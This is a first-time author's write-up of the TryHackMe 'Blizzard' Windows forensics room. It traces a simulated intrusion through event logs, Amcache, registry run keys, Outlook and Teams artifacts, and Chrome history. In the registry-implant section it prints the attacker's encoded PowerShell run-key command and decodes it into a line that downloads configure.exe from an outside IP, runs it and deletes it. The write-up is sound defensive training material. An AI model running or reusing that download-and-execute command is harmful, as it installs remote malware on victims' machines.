# Blizzard
**Description:** A critical alert was triggered from a sensitive server. You are tasked to perform a live investigation on multiple machines to determine the root cause of the incident.  
**Difficulty:** Medium  
**Link:** https://tryhackme.com/r/room/blizzard

## Task 1: Introduction: Analysing the Impact

Disclaimer: This is my first ever write-up and I am not an expert in the field of Windows forensics. While the answers are factually correct, there might be much more efficient ways to obtain them.

>When did the attacker access this machine from another internal machine? (format: MM/DD/YYYY HH:MM:SS)

We could probably answer this using the native Windows Event Viewer (`eventvwr.msc`), but let's instead make use of the tools provided in the room. First we run [Eric Zimmerman's](https://ericzimmerman.github.io/#!index.md) event log parser EvtxECmd.

```
C:\Tools\EvtxECmd\EvtxECmd.exe -f C:\Windows\System32\winevt\Logs\Security.evtx --inc 4624,4625 --csv .
```

![screenshot1](/Blizzard/assets/screenshot1.png)

We command the tool to read in the security log file at `C:\Windows\System32\winevt\Logs\Security.evtx`, exctract successful (Event ID 4624) and failed (4625) logons and write the data to a CSV file in the current folder.

![screenshot2](/Blizzard/assets/screenshot2.png)

Now we can finally have a look at the logs by opening the output file in Timeline Explorer (shortcut on the desktop). Scrolling through the data we notice the `Remote Host` column, which in some rows contains IP addresses. Before wasting any time manually going through a thousand rows of logs, we can use the task description to greatly narrow down our search:

>The IT team has also shared that the infected database server is set up for internal access only and is not yet linked to other systems

We can figure out which network the machine is connected to using ipconfig

![screenshot3](/Blizzard/assets/screenshot3.png)

Here some basic networking knowledge helps. An IPv4 address of `10.10.211.166` with a `255.255.0.0` subnet mask means we are on the `10.10.0.0/16` network, in other words: All hosts on the same, internal, network must start with `10.10.`.

By clicking below the `Remote Host` column heading in Timeline Explorer we create a filter `contains 10.10.` We also know from the task description that the data exfiltration was detected at time `03/24/2024 19:55:29`, so we can add another filter for the `Time Created` column, displaying only logs from the same day.

We have now narrowed it down to 146 rows of data. Ordering them by `Time Created`, adjusting the columns to display only relevant data, and focussing on the rows immediately before the incident was detected, we notice a logon `Type 3` for user `dbadmin` followed by a logon `Type 10` one second later. Some googling later I knew that `Type 3` stands for `Network` while `Type 10` denotes `RemoteInteractive` logons, most likely RDP ([Microsoft Docs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787567(v=ws.10))). 

![screenshot4](/Blizzard/assets/screenshot4.png)

Full disclosure: I still don't fully understand what is going on here, why there is one succesful `Type 3` logon at second `01` followed by an identical one less than a minute later and then ultimately a `Type 10`. As far as flags are concerned, I tried each of the three timestamps and then did some googling in an attempt to understand the correct answer. [One article I found](https://frsecure.com/blog/rdp-connection-event-logs/) points to event ID 1149 in the `TerminalServices-RemoteConnectionManager/Operational` log specifically for successful RDP logons. I wanted to confirm that, so I ran EvtxECmd again:

```
C:\Tools\EvtxECmd\EvtxECmd.exe -f C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx --inc 1149 --csv .
```
![screenshot5](/Blizzard/assets/screenshot5.png)

Opened in Timeline Explorer we only have a couple of rows, with precisely one containing `dbadmin` and a `10.10.0.0/16` remote host. Probably not the cleanest method, but this timestamp, which matches the redacted one in the security event log above, is the one we are looking for.

![screenshot6](/Blizzard/assets/screenshot6.png)

>What is the full file path of the binary used by the attacker to exfiltrate data?

Amcache is a Windows artifact that among other things, stores information on executables that were executed on a system. Another one of Zimmerman's tools, AppCompatCacheParser, pulls the data for us and hands us a CSV file to work with.

```
C:\Tools\AppCompatCacheParser\AppCompatCacheParser.exe --csv .
```

![screenshot7](/Blizzard/assets/screenshot7.png)

Once we've opened the file in Timeline Explorer, filtered for `Executed=Yes`, sorted by `Cache Entry Position`, and arranged the columns for better visibility, we find the local PostgreSQL database [has been backed up](https://www.postgresql.org/docs/current/app-pgdump.html), followed by the execution of `######.exe` from `dbadmin`'s home directory.

![screenshot8](/Blizzard/assets/screenshot8.png)

If the name doesn't give it away already, let's Google the thing to be safe:

![screenshot9](/Blizzard/assets/screenshot9.png)

We found the culprit, next question.

>What email is used by the attacker to exfiltrate sensitive data?

This is probably part of the configuration data for the cloud backup tool found in the previous question. After a quick web search we are looking for `######.conf`. With the power of PowerShell:

```
Get-ChildItem -Path C:\Users\*######* -Force -Recurse -ErrorAction SilentlyContinue
```
we quickly find the file

![screenshot10](/Blizzard/assets/screenshot10.png)

and reveal its content

![screenshot11](/Blizzard/assets/screenshot11.png)

>Where did the attacker store a persistent implant in the registry? Provide the registry value name.

Two [keys contain programs](https://learn.microsoft.com/pl-pl/windows/win32/setupapi/run-and-runonce-registry-keys) that run every time a user logs on:

* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

The file for the former is located at `C:\Windows\System32\config\SOFTWARE`, for the latter at `C:\Users\<USER>\NTUSER.DAT`. But we don't need to look for these files, which in a live system are locked by the OS, manually, since `Registry Explorer` imports them at the click of a button.

![screenshot12](/Blizzard/assets/screenshot12.png)

There we have it, this

![screenshot13](/Blizzard/assets/screenshot13.png)

```
powershell.exe -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvADEAMgA4AC4AMQA5ADkALgAyADQANwAuADEANwAzAC8AYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgACQAZQBuAHYAOgBhAHAAcABkAGEAdABhAFwAYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgBhAHAAcABkAGEAdABhAFwAYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQA7ACAAcgBtACAAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEAXABjAG8AbgBmAGkAZwB1AHIAZQAuAGUAeABlAA==
```
is run every time a user logs in. The key's `Value Name` is the flag. The task doesn't ask for it, but the `-enc` option lets you feed Powershell with Base64 (crucial for decoding: using the UTF-16LE character set) encoded commands. This can be used in an attempt to evade detection as seen here. The decoded command

```
iwr -useb http://128.199.247.173/configure.exe -outfile $env:appdata\configure.exe; Start-Process $env:appdata\configure.exe; rm $env:appdata\configure.exe
```
downloads `configure.exe` from a remote host, executes it, and then deletes it again.

>Aside from the registry implant, another persistent implant is stored within the machine. When did the attacker implant the alternative backdoor? (format: MM/DD/YYYY HH:MM:SS)

I am sure there is a more efficient way (that's probably true for other things I did, as I'm new to Windows forensics), but after having ruled out Scheduled Tasks, I adapted a Powershell script from [another THM room](https://tryhackme.com/r/room/windowsapplications) to enumerate services

```powershell
$services = Get-Service | Where-Object {$_.StartType -eq "Automatic"}
foreach ($service in $services) {                                                        
    $serviceName = $service.Name                                                           
    $serviceWMI = (Get-WmiObject Win32_Service | Where-Object { $_.Name -eq $serviceName})      
    $servicePath = $serviceWMI.PathName
    Write-Host "Service Name: $serviceName"
    Write-Host "Executable Path: $servicePath"
    Write-Host "--------------------"
}
```
The code first retrieves all services that are configured to start automatically when the system starts, then prints relevant information on the screen for me to manually filter. The output only being a couple of dozen lines long, one service immediately stood out while the script was still running

![screenshot14](/Blizzard/assets/screenshot14.png)

Having found `CDPUserSvc_9286x` I now simply loaded the `SYSTEM` registry hive into Registry Explorer and searched for the service name.

![screenshot15](/Blizzard/assets/screenshot15.png)

Both search results come with identical `Last write` timestamps. That is when the service was created and with that, the answer to the last question of task 1.


## Task 2: Lateral Movement: Backtracking the Pivot Point

>When did the attacker send the malicious email? (format: MM/DD/YYYY HH:MM:SS)

The path to victory here is to copy the process from the [Windows Applications Forensics room](https://tryhackme.com/r/room/windowsapplications) that was listed as prerequisite for this one.

Outlook stores a local copy of a user's mailbox to enable offline access. Whenever the machine connects to the network, the local file is synchronized with the remote server. We can enumerate these `.OST` files with PowerShell.

```powershell
ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Local\Microsoft\Outlook\" 2>$null | findstr Directory}
```
lists directories where `.OST` files are potentially to be found. Since this is one employee's workstation, the single result points to a user `m.anderson`. We've seen this name before in the previous task.

![screenshot16](/Blizzard/assets/screenshot16.png)

To make sense of `C:\Users\m.anderson\AppData\Local\Microsoft\Outlook\m.anderson@healthspheresolutions.onmicrosoft.com.ost` and possibly find the malicious email, we open the file with the XsT Reader utility from `C:\Tools`. In the software we click on `Root - Mailbox => IPM_SUBTREE => Inbox` and are presented with a list of inbound emails.

![screenshot17](/Blizzard/assets/screenshot17.png)

My guess was that the malicious email must be the one with the password-protected `.ZIP` attachment, so I spent some time going through the metadate to substantiate my suspicion. I did not find anything, which although disappointing is in line with real life, where phishing is sometimes sent from [compromised, but legitimate](https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/) internal email accounts. Or did I miss something?

In any case, a click on `Properties` in the bottom right corner reveals the `ClientSubmitTime`, which converted from 12 to 24-hour clock format is the correct answer.

>When did the victim open the malicious payload? (format: MM/DD/YYYY HH:MM:SS)

This calls for AppCompatCacheParser again. For more details see task 1 of this write-up. We open the parsed file in Timeline Explorer, filter for `Executed=Yes` and order by `Last Modified Time UTC`. The last entry in the table is also the only one executed on the evening of the incident, pointing us towards `configure.exe` in `m.anderson`'s home directory.

![screenshot18](/Blizzard/assets/screenshot18.png)

Note: I had originally decided against unpacking the password-protected `.ZIP` attachment. It might have self-destructed the box or something, forcing me to start over. An easter egg of sorts. After finishing the write-up I went back and took the risk. The archive contains a Windows shortcut that points to the following command encoded in Base64, confirming previous findings about `configure.exe`:
```
iwr -useb http://128.199.247.173/configure.exe -outfile $env:app
```

I now decided to poke around said user home directory, deviating from the room's order of questions. What I found in `C:\Users\m.anderson\Documents\` was a set of custom scripts for various system administration tasks. One of them, `demo_automation.ps1`, which downloads and installs PostgreSQL and connects to a remote computer, comes with a hardcoded password.

![screenshot19](/Blizzard/assets/screenshot19.png)

>What file did the attacker leverage to gain access to the database server? Provide the password found in the file.

Besides answering the last question of the task this explains how the intruder was able to exfiltrate data from `HS-SQL-01`.

>When was the malicious persistent implant created? (format: MM/DD/YYYY HH:MM:SS)

I again shamelessly borrowed from the [Windows Applications Forensics](https://tryhackme.com/r/room/windowsapplications) room, which provides PowerShell code to list all enabled tasks ordered by creation date:

```powershell
Get-ScheduledTask | Where-Object {$_.Date -ne $null -and $_.State -ne "Disabled"} | Sort-Object Date | select Date,TaskName,Author,State,TaskPath | ft
```

![screenshot20](/Blizzard/assets/screenshot20.png)

Only one task was created on the day of the incident, by m.anderson of all users. This must be the answer. Now to the last question in task 2.

>What is the domain accessed by the malicious implant? (format: defanged)

If there is a direct path from the previously found `SysUpdate` task to the answer of this question, I did not find it. There is nothing of relevance in the `C:\Windows\System32\Tasks\Microsoft\Windows\Clip\SysUpdate\SysUpdate` file. So I thought "domain", that's either Active Directory or [DNS](https://en.wikipedia.org/wiki/Domain_Name_System). Going for what I believed was quicker to potentially rule out, I checked the local DNS cache and hosts file first:

![screenshot21](/Blizzard/assets/screenshot21.png)

A popular German proverb roughly translates to "Even a blind hen once in a while finds a kernel of corn". With that I conclude the write-up of task 2.


## Task 3: Initial Access: Discovering the Root Cause

>When did the victim receive the malicious phishing message? (format: MM/DD/YYYY HH:MM:SS)

Since the task description mentions O365, we assume the employee uses Microsoft Teams. Once again applying knowledge from the [Windows Applications Forensics room](https://tryhackme.com/r/room/windowsapplications), we execute a line of PowerShell code to scout potential locations of Teams chat history:

```powershell
ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Roaming\Microsoft\Teams" 2>$null | findstr Directory}
```

![screenshot22](/Blizzard/assets/screenshot22.png)

To be able to read the data, we run the `ms_teams_parser.exe` from `C:\Tools` with the `.leveldb` file found in `a.ramirez`' home directory.

![screenshot23](/Blizzard/assets/screenshot23.png)

The output is a text file in `JSON` format that we could go through using notepad, but to be fancy and for better readability I copied the contents to VS Code on my local machine. The file begins with an array of objects representing contacts in Teams, with fields such as `displayName` and `mri` (something like a user ID). 

![screenshot24](/Blizzard/assets/screenshot24.png)

Following that we find objects for individual messages, containing the `content`, `createdTime`, `originalArrivalTime` (in [UNIX time](https://en.wikipedia.org/wiki/Unix_time)) and `creator`. In order to find the malicious message we could search the file for `https://` and check the 13 results one by one (assuming a phishing message is going to link to something), but we're lucky and the very first message, urging the recipient to click on a link, already seems to be what we're looking for.

![screenshot25](/Blizzard/assets/screenshot25.png)

Either of the redacted timestamps is the answer to our question. The URL from the message, once defanged with square brackets (`hxxps[://]example[[.]]com`), answers question three:

>What is the URL of the malicious phishing link? (format: defanged)

The answer to this question

>What is the display name of the attacker?

is not far either. We copy the `creator` value from the message, search the file for it and find ourselves back at the beginning where contacts are defined.

![screenshot26](/Blizzard/assets/screenshot26.png)

That's all there is to it. Two questions to go.

>What is the title of the phishing website?

>When did the victim first access the phishing website? (format: MM/DD/YYYY HH:MM:SS in UTC)

Since Edge is not installed I'm taking a wild guess that the employee uses Chrome over Internet Explorer. Another line of PowerShell code gives us the the location of `a.ramirez`' browsing data, including history, cache, bookmarks, installed extensions and other valuable information.

```powershell
ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Local\Google\Chrome\User Data\Default" 2>$null | findstr Directory}
```

![screenshot27](/Blizzard/assets/screenshot27.png)

From the desktop we open `hindsight_gui`, which prompts us to visit `http://localhost:8080/` in a browser of our choice.

![screenshot28](/Blizzard/assets/screenshot28.png)

The Hindsight UI asks for the path to the previously established folder containing browsing (meta)data. On the right we can select plugins, but since I am not familiar with them, I leave all on. A crucial but easy to miss setting here is the timezone, which as per task instructions we need to set to UTC. Yes, I did miss that and spent a good ten minutes trying to make sense of the timestamps.

![screenshot29](/Blizzard/assets/screenshot29.png)

Once the data is parsed, 117 URL records among it, we save it to disk as a SQLite database.

![screenshot30](/Blizzard/assets/screenshot30.png)

Now for our last step of the investigation, we open `DB Browser for SQLite` from the desktop and load the database just exported from `Hindsight`. The tool allows manual perusing of rows and columns, but I prefer a simple SQL query.

```sql
SELECT * FROM timeline WHERE type='url' AND url LIKE '%#############%'
```

reads all fields of all rows from the `timeline` table, for which the `type` field is equal to `url` and the `url` field contains the phishing URL from the Teams message we found earlier.

![screenshot31](/Blizzard/assets/screenshot31.png)

All question being answered we have reached the end of my first write-up. I hope it was of some help and I made all steps clear enough to reproduce. I might give video walkthroughs a try in the near future. Feedback is very welcome!


